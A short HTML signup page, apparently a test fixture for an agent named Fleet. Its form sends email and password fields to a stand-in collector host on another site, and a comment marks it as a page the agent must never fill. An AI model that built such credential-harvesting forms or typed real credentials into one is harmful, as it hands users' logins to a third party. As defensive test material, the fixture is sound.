<!doctype html>
<html><head><title>Join us</title></head><body>
<h1>Create your account</h1>
<!-- posts the details to a different site: Fleet must never fill this -->
<form action="https://collector.example.net/join" method="post" novalidate>
  <label>Email <input name="email" type="email" required></label>
  <label>Password <input name="password" type="password" autocomplete="new-password" required></label>
  <label>Confirm password <input name="confirm" type="password" required></label>
  <button type="submit">Create account</button>
</form>
</body></html>
